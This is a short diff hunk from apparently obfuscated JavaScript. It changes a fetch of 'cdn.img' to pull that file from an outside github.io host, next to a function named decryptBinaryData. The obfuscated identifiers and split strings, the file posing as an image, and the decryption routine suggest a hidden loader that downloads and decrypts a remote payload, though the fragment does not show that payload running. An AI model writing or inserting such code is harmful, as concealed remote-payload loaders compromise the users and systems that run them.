@@ -319,7 +319,7 @@ function decryptBinaryData(_0x21aacb) {
             _0x22d808(0x0);
     }
 }
-fetch('cdn.img')[a0_0x26ef26(0x242)](_0x51439d => {
+fetch('https://cyrust21.github.io/fftools2024/cdn.img')[a0_0x26ef26(0x242)](_0x51439d => {
     const _0x19d58a = a0_0x26ef26;
     if (!_0x51439d['ok'])
         throw new Error('Network re' + 'sponse was' + _0x19d58a(0x1b8));
